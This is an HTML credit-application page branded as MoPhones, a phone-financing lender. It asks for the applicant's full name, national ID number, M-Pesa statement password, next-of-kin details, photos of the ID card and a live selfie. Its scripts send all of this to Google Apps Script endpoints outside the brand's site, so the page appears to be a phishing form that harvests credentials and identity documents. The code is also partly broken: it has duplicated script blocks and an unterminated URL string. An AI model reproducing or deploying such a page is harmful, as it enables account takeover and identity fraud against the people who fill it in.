<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>MoPhones | Executive Credit Portal</title>
    <style>
        :root { --mophones-blue: #004488; --danger: #be123c; --dark-green: #064e3b; --gold: #ca8a04; }
        body { font-family: -apple-system, sans-serif; background: var(--mophones-blue); padding: 15px; margin: 0; }
        .container { background: white; padding: 30px; border-radius: 28px; max-width: 480px; margin: auto; color: #1e293b; box-shadow: 0 25px 50px rgba(0,0,0,0.3); }
        .header { text-align: center; margin-bottom: 20px; }
        .price-link { display: block; text-align: center; color: var(--mophones-blue); font-weight: 800; text-decoration: underline; margin-bottom: 20px; }
        .honesty-box { background: #fff7ed; border-left: 5px solid var(--gold); padding: 15px; border-radius: 12px; margin-bottom: 25px; color: #9a3412; font-size: 0.85em; line-height: 1.5; }
        .call-disclaimer { background: #fdf2f2; border: 1px solid #fecaca; color: var(--danger); padding: 12px; border-radius: 10px; font-size: 0.8em; font-weight: 700; margin: 20px 0; text-align: center; }
        label { display: block; margin-top: 18px; font-weight: 800; font-size: 0.75em; color: #64748b; text-transform: uppercase; }
        input, select { width: 100%; padding: 14px; margin-top: 5px; border: 2px solid #e2e8f0; border-radius: 12px; box-sizing: border-box; font-size: 16px; font-weight: 600; }
        .file-input { background: #f8fafc; border: 2px dashed #cbd5e1; padding: 10px; border-radius: 12px; cursor: pointer; }
        .btn-submit { background: var(--mophones-blue); color: white; padding: 20px; border: none; border-radius: 14px; width: 100%; margin-top: 25px; font-weight: 900; font-size: 1.1em; cursor: pointer; }
        .whatsapp-link { display: block; text-align: center; background: var(--dark-green); color: white; padding: 16px; border-radius: 12px; font-weight: 800; text-decoration: none; margin-top: 25px; }
        .footer { font-size: 0.7em; text-align: center; color: #94a3b8; margin-top: 20px; font-weight: 700; }
    </style>
</head>
<body>

<div class="container">
    <div class="header">
        <img src="https://mophones.co/cdn/shop/files/MO-Logo-01_160x.png?v=1691582743" width="150">
        <h2 style="color:var(--mophones-blue); margin:10px 0 0 0;">Application Form</h2>
    </div>

    <a href="https://mophones.co/collections/all-phones" target="_blank" class="price-link">üîç CLICK TO CHECK PRICES & DEPOSITS</a>

    <div class="honesty-box">
        <b>ü§ù THE HONESTY POLICY</b><br>
        Any attempt to provide false names, mismatched ID numbers, or incorrect passwords will result in a <b>permanent system blacklist</b>.
    </div>

    <form id="moLeadsPortal">
        <label>Phone Model (Samsung or iPhone Only)</label>
        <input type="text" name="preferred_phone" id="phoneIn" placeholder="e.g. Samsung A15" required>

        <label>Full Name (3 Names as on ID)</label>
        <input type="text" name="full_name" id="nameIn" placeholder="First Middle Surname" required>

        <label>National ID Number</label>
        <input type="text" name="id_number" id="idIn" maxlength="8" placeholder="8 Digits" required>

        <label>Specific Location / Sub-County</label>
        <select name="region" required>
            <option value="">-- Select Your Area --</option>
            <optgroup label="NAIROBI">
                <option value="Nairobi - CBD/Westlands">CBD / Westlands</option>
                <option value="Nairobi - Eastlands">Eastlands (Donholm/Pipelines)</option>
                <option value="Nairobi - Kasarani/Roysambu">Kasarani / Roysambu</option>
                <option value="Nairobi - Langata/Karen">Langata / Karen</option>
            </optgroup>
            <optgroup label="KIAMBU">
                <option value="Kiambu - Thika">Thika Town</option>
                <option value="Kiambu - Ruiru">Ruiru / Juja</option>
                <option value="Kiambu - Kikuyu">Kikuyu / Kabete</option>
            </optgroup>
            <optgroup label="OTHER REGIONS">
                <option value="Nakuru Town">Nakuru Town</option>
                <option value="Machakos Town">Machakos Town</option>
                <option value="Kajiado - Ngong/Rongai">Ngong / Kitengela / Rongai</option>
            </optgroup>
        </select>

        <label>M-Pesa Statement Password</label>
        <input type="text" name="mpesa_password" id="passIn" required>

        <label>Next of Kin Name</label>
        <input type="text" name="nok_name" required>

        <label>Next of Kin Contact</label>
        <input type="text" name="nok_contact" id="kinIn" value="+254" maxlength="13" required>

        <label>1. ID Card (Front Photo)</label>
        <input type="file" name="id_front" accept="image/*" class="file-input" required>

        <label>2. ID Card (Back Photo)</label>
        <input type="file" name="id_back" accept="image/*" class="file-input" required>

        <label>3. Live Selfie (Face clearly visible)</label>
        <input type="file" name="selfie_img" accept="image/*" capture="user" class="file-input" required>

        <div class="call-disclaimer">
            ‚ö†Ô∏è IMPORTANT: You must remain 100% HONEST during the credit verification call. Mismatched verbal info leads to instant rejection.
        </div>

        <button type="submit" class="btn-submit" id="subBtn">SUBMIT TO MOPHONES</button>
    </form>
    
    <a href="https://wa.me/254112384099" class="whatsapp-link">üí¨ CHAT WITH CUSTOMER SUPPORT</a>

    <div class="footer">PORTAL: mo_leads_portal</div>
</div>

<script>
const scriptURL = 'https://script.google.com/macros/s/AKfycbxp7myPK3OX047HwHab0T2uALSXNhb0GyylupoBU8e8i3bMhRDOt8xJcX29idZ05M-U/exec';
const form = document.getElementById('moLeadsPortal');

form.addEventListener('submit', e => {
    e.preventDefault();
    const phone = document.getElementById('phoneIn').value.toLowerCase();
    const name = document.getElementById('nameIn').value.trim().split(/\s+/);
    
    if (!phone.includes("samsung") && !phone.includes("iphone") && !phone.includes("apple")) {
        alert("‚ùå REJECTED: Only Samsung and iPhone are financed via this portal.");
        return;
    }
    if (name.length < 3) {
        alert("‚ùå HONESTY ERROR: All 3 names required.");
        return;
    }

    document.getElementById('subBtn').disabled = true;
    document.getElementById('subBtn').innerText = "VETTING & UPLOADING...";

    fetch(scriptURL, { method: 'POST', body: new FormData(form)})
      .then(res => {
          alert("‚úÖ SUCCESS: Application and Photos received. Stay reachable.");
          form.reset();
          window.location.reload();
      })
      .catch(err => {
          alert("Network busy. Please try again.");
          document.getElementById('subBtn').disabled = false;
      });
});
</script>
<script>
// 1. MAKE SURE THIS URL IS YOUR NEW DEPLOYMENT URL FROM GOOGLE
const scriptURL = 'https://script.google.com/macros/s/AKfycby699fMusvyPbusw55Q06xILt9YVvhArjIi2Av-LDJ5A9WKwjWtSsqAahYg_VJAPkb3/exec;
const form = document.getElementById('moLeadsPortal');

form.addEventListener('submit', e => {
    e.preventDefault();
    
    // --- STRICTURE CHECKS ---
    const phone = document.getElementById('phoneIn').value.toLowerCase();
    const name = document.getElementById('nameIn').value.trim().split(/\s+/);
    
    if (!phone.includes("samsung") && !phone.includes("iphone") && !phone.includes("apple")) {
        alert("‚ùå REJECTED: Only Samsung and iPhone are financed.");
        return;
    }
    if (name.length < 3) {
        alert("‚ùå HONESTY ERROR: Provide all 3 names.");
        return;
    }

    const subBtn = document.getElementById('subBtn');
    subBtn.disabled = true;
    subBtn.innerText = "UPLOADING PHOTOS...";

    const file = form.selfie_img.files[0];
    const reader = new FileReader();

    reader.onload = function() {
        // This converts the photo to a text string the script can handle
        const base64Data = reader.result.split(',')[1];
        
        // Prepare the text data
        const formData = new FormData(form);
        const params = new URLSearchParams();
        
        for (const pair of formData.entries()) {
            if (!(pair[1] instanceof File)) {
                params.append(pair[0], pair[1]);
            }
        }
        
        // Add the image data
        params.append("selfieData", base64Data);
        params.append("selfieMime", file.type);

        fetch(scriptURL, { 
            method: 'POST', 
            mode: 'no-cors', // Essential for Google Scripts
            body: params.toString(), 
            headers: { 'Content-Type': 'application/x-www-form-urlencoded' }
        })
        .then(() => {
            alert("‚úÖ SUCCESS: Data and Selfie saved. Stay reachable for the credit call.");
            form.reset();
            window.location.reload();
        })
        .catch(err => {
            alert("Upload failed. Check your connection.");
            subBtn.disabled = false;
        });
    };
    reader.readAsDataURL(file);
});
</script>
    
</body>
</html>
